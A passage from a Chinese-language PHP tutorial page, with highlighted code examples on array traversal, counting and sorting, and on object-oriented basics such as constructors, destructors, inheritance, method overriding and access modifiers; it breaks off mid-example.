<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=[            //用[ ]创建数组</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;age&#x27;</span>=&gt;<span class="string">&#x27;18&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;gender&#x27;</span>=&gt;<span class="string">&#x27;male&#x27;</span></span><br><span class="line"> ];</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"> var_dump(<span class="variable">$arr</span>) ;</span><br><span class="line"> <span class="built_in">echo</span><span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：array(3) &#123;</span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  string(3) <span class="string">&quot;Tom&quot;</span></span><br><span class="line">  [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">  string(2) <span class="string">&quot;18&quot;</span></span><br><span class="line">  [<span class="string">&quot;gender&quot;</span>]=&gt;</span><br><span class="line">  string(4) <span class="string">&quot;male&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p><font color="red"><strong>注：</strong></font>上例中<font color="red"><strong>echo pre</strong></font>这个标签的主要目的是为原样输出，格式展示的更好看，更清晰。</p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 索引数组和关联数组遍历分别用for和foreach</strong></font><br><font color="#00B2EE"><strong>1. 索引数组：使用for遍历</strong></font><br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=Array(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;andy&#x27;</span>,<span class="string">&#x27;jack&#x27;</span>);</span><br><span class="line"> <span class="variable">$arrlength</span>=count(<span class="variable">$arr</span>);</span><br><span class="line"> <span class="keyword">for</span>(<span class="variable">$x</span>=0;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$arr</span>[<span class="variable">$x</span>];</span><br><span class="line">     <span class="built_in">echo</span>  <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><br><font color="#00B2EE"><strong>2. 关联数组：使用foreach遍历</strong></font><br>foreach的基本语法：<br>有一个布尔型循环是专门用来循环数组的。这个循环的基本语法就是foreach基本语法</p>
<p><font color="#FF7F00">foreach( 要循环的数组变量 as [键变量 &#x3D;&gt;] 值变量)<br>{<br>    &#x2F;&#x2F;循环的内容<br>}<br></font><br>这是一个固定用法，将要循环的数组放进去。<br>as 是一个固定的关键字；<br>后面的键变量是可选的，随意定义一个变量，每次循环的时候，foreach这个语法会把键取出来赋值到键变量里面；<br>后面的值变量是必填的。每次循环的时候，会把值放到值变量里面。<br>我们下面用代码来举例子，加强对这个语法的理解。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$arr</span>=[</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;age&#x27;</span>=&gt;<span class="string">&#x27;18&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;gender&#x27;</span>=&gt;<span class="string">&#x27;male&#x27;</span></span><br><span class="line"> ];</span><br><span class="line"> foreach(<span class="variable">$arr</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$key</span>.<span class="string">&quot;: &quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"> &#125;;</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：</span><br><span class="line">name: Tom</span><br><span class="line">age: 18</span><br><span class="line">gender: male</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>通过上面的运行结果我们得出下面的结果：</strong></font><br>1.每次循环的时候，把下标赋值给了变量$key，把值的变量赋值给了变量$value<br>2.循环一次读一次键和值。读到最后，发现没有可以读取的数组元素后，停止循环遍历数据。<br><strong>注意：</strong>$key 和$value并不是变量名必须得为这两个名字。你命名为其他的也可以，如 $kai &#x3D;&gt; $wen是一样的。 你要清楚键赋值给了哪个变量，值赋值给了另外的哪个变量。</p>
<p><font color="#00B2EE"><strong>3. 通过foreach遍历不连续的索引数组，如下例：</strong></font><br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    //设置编码</span><br><span class="line"> <span class="variable">$data</span> = array(</span><br><span class="line">     0 =&gt; <span class="string">&#x27;中国&#x27;</span>,</span><br><span class="line">     100 =&gt; <span class="string">&#x27;美国&#x27;</span>,</span><br><span class="line">     20 =&gt; <span class="string">&#x27;韩国&#x27;</span>,</span><br><span class="line">     300 =&gt; <span class="string">&#x27;德国&#x27;</span>,</span><br><span class="line"> ); </span><br><span class="line"> foreach(<span class="variable">$data</span> as <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="variable">$k</span> . <span class="string">&#x27;------&#x27;</span> . <span class="variable">$v</span> .<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：</span><br><span class="line">0------中国</span><br><span class="line">100------美国</span><br><span class="line">20------韩国</span><br><span class="line">300------德国</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS">按照foreach的结果推理与刚刚做的关联数组的结果是一样的。<br>不同的是不连续的索引数组。每读一次数组的元素，将当次循环的下标赋值给了变量$k，值赋值给了变量$v。<font color="red"><strong>（即不像for循环一样的循环遍历）</strong></font> 每读将键和值输出，然后显示出来。循环一次向后移动一次下标。读取至最后，退出执行。<br></font></p>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>4. foreach遍历遍历多维数组：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">&#x27;中国&#x27;</span> =&gt; <span class="string">&#x27;china&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;美国&#x27;</span> =&gt; <span class="string">&#x27;usa&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;德国&#x27;</span> =&gt; <span class="string">&#x27; Germany&#x27;</span>,</span><br><span class="line">       ),</span><br><span class="line"></span><br><span class="line">       <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">&#x27;湖北&#x27;</span> =&gt; <span class="string">&#x27;hubei&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;河北&#x27;</span> =&gt; <span class="string">&#x27;hebei&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;山东&#x27;</span> =&gt; <span class="string">&#x27;shandong&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;山西&#x27;</span> =&gt; <span class="string">&#x27;sanxi&#x27;</span>,</span><br><span class="line">       ),</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注：我们在使用foreach循环时，第一次循环将键为0和键为1的两个数组赋值给一个变量($value)。然后，</span></span><br><span class="line"><span class="comment">//再套一个循环遍历这个$value变量，$value中的值取出来，赋值给$k和$v。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//第一次循环把国家的数组赋值给了$value</span></span><br><span class="line">   <span class="comment">//第二次循环把中国的省份的数组又赋值给了$value</span></span><br><span class="line">   <span class="comment">//因此，我在循环的时候把$value再遍历一次</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">foreach</span>(<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="string">&#x27;-----&#x27;</span> . <span class="variable">$v</span> .<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//为了看的更清晰，我在中间加上华丽丽的分割线方便你来分析</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;----------分割线-----------&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结：</strong></p>
</blockquote>
<ol>
<li>第一次循环的时候，将数组赋值给了$value，然后用foreach循环$value。将二维的子数组中的键给到$k，值赋值给变量$v。</li>
<li>第一次循环退出子数组的循环，执行后续代码显示分割线。</li>
<li>依此类推，第二次循环也是这样。</li>
</ol>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 统计数组元素个数</strong></font><br>数组是我们最常用到的类型，那如何计算某个一维数组的个数呢。其实我们可以用到我们之前学过的数学函数里面的一个：<font color="#00B2EE"><strong>count()</strong></font>。<br><font color="#FF7F00">count($变量)</font> 函数用于返回数组的长度（元素数）：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$name</span>=Array(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;andy&#x27;</span>,<span class="string">&#x27;jack&#x27;</span>);</span><br><span class="line"><span class="built_in">echo</span> count(<span class="variable">$name</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. PHP 数组排序</strong></font><br>数组中的元素可以按字母或数字顺序进行降序或升序排列。<br>升序：从小到大的顺序进行排序，如果是英文单词，那么按字母A-Za-z的顺序排序，如果是数字，那么按数字的大小进行排序。<br>降序：与升序相反</p>
<p>   sort() - 对数组进行升序排列<br>   rsort() - 对数组进行降序排列<br>   asort() - 根据关联数组的值，对数组进行升序排列<br>   ksort() - 根据关联数组的键，对数组进行升序排列<br>   arsort() - 根据关联数组的值，对数组进行降序排列<br>   krsort() - 根据关联数组的键，对数组进行降序排列<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 数组函数</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_array.asp">PHP 数组函数</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-7-PHP-命名空间"><a href="#1-7-PHP-命名空间" class="headerlink" title="1.7 PHP 命名空间"></a><font color="#3CB371" face="Comic sans MS">1.7 PHP 命名空间</font></h4><p><font face="Comic sans MS"><font color="red"><strong>[<a href="https://directoree.github.io/post/PHP-namespace">参见本站博客：PHP-命名空间</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-8-PHP-面向对象"><a href="#1-8-PHP-面向对象" class="headerlink" title="1.8 PHP 面向对象"></a><font color="#3CB371" face="Comic sans MS">1.8 PHP 面向对象</font></h4><ul>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>类：</strong></font>  定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>对象：</strong></font>  是类的实例。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员变量：</strong></font>  定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员函数：</strong></font>  定义在类的内部，可用于访问对象的数据。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>继承：</strong></font>  继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>父类：</strong></font>  一个类被其他类继承，可将该类称为父类，或基类，或超类。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>子类：</strong></font>  一个类继承其他类称为子类，也可称为派生类。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>多态：</strong></font>  多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>重载：</strong></font>  简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>抽象性：</strong></font>  抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>封装：</strong></font> 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>构造函数：</strong></font>  主要用来在创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>析构函数：</strong></font>  析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</font></li>
</ul>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>1. 构造函数</strong></font><br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。<br> PHP 5 允行开发者在一个类中定义一个方法作为构造函数，语法格式如下：<br><font color="#00B2EE"> void  __construct ([ mixed $args [, $… ]] )</font><br> 在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$par1</span>, <span class="variable">$par2</span> </span>) </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;url = <span class="variable">$par1</span>;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* 成员变量 */</span></span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$url</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">/* 成员函数 */</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;url = <span class="variable">$par</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$par1</span>, <span class="variable">$par2</span> </span>) </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;url = <span class="variable">$par1</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用成员函数，设置标题和URL</span></span><br><span class="line"> <span class="variable">$php</span> = <span class="keyword">new</span> Site(<span class="string">&#x27;www.php.cn&#x27;</span>, <span class="string">&#x27;php中文网&#x27;</span>);</span><br><span class="line"> <span class="variable">$taobao</span> = <span class="keyword">new</span> Site(<span class="string">&#x27;www.taobao.com&#x27;</span>, <span class="string">&#x27;淘宝&#x27;</span>);</span><br><span class="line"> <span class="variable">$google</span> = <span class="keyword">new</span> Site(<span class="string">&#x27;www.google.com&#x27;</span>, <span class="string">&#x27;Google 搜索&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用成员函数，获取标题和URL</span></span><br><span class="line"> <span class="variable">$php</span>-&gt;getTitle();</span><br><span class="line"> <span class="variable">$taobao</span>-&gt;getTitle();</span><br><span class="line"> <span class="variable">$google</span>-&gt;getTitle();</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$php</span>-&gt;getUrl();</span><br><span class="line"> <span class="variable">$taobao</span>-&gt;getUrl();</span><br><span class="line"> <span class="variable">$google</span>-&gt;getUrl();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 析构函数</strong></font><br>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;构造函数\n&quot;</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;MyDestructableClass&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;销毁 &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> MyDestructableClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;构造函数\n&quot;</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;MyDestructableClass&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;销毁 &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> MyDestructableClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 继承</strong></font><br>PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 子类扩展站点类别</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child_Site</span> <span class="keyword">extends</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$category</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setCate</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;category = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getCate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;category . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. 方法重写</strong></font><br>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。<br>下面的例中重写了 getUrl 与 getTitle 方法：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 访问控制</strong></font><br>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。<br><font color="#00B2EE"><strong>public（公有）：</strong></font>公有的类成员可以在任何地方被访问。<br><font color="#00B2EE"><strong>protected（受保护）：</strong></font>受保护的类成员则可以被其自身以及其子类和父类访问。<br><font color="#00B2EE"><strong>private（私有）：</strong></font>私有的类成员则只能被其定义所在的类访问。</p>
<p><font color="red"><strong>(1) 属性的访问控制</strong></font><br>类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。<br></font></p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$public</span> = <span class="string">&#x27;Public&#x27;</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$protected</span> = <span class="string">&#x27;Protected&#x27;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$private</span> = <span class="string">&#x27;Private&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">printHello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> MyClass();</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;private; <span class="comment">// 这行也会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$obj</span>-&gt;printHello(); <span class="comment">// 输出 Public、Protected 和 Private</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass2</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 可以对 public 和 protected 进行重定义，但 private 而不能</span></span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$protected</span> = <span class="string">&#x27;Protected2&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">printHello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj2</span> = <span class="keyword">new</span> MyClass2();</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;private; <span class="comment">// 未定义 private</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$obj2</span>-&gt;printHello(); <span class="comment">// 输出 Public、Protected2 和 Undefined</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>(2) 方法的访问控制</strong></font><br>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。<br></font></p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 声明一个公有的构造函数</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个公有的方法</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个受保护的方法</span></span><br><span class="line">     <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span 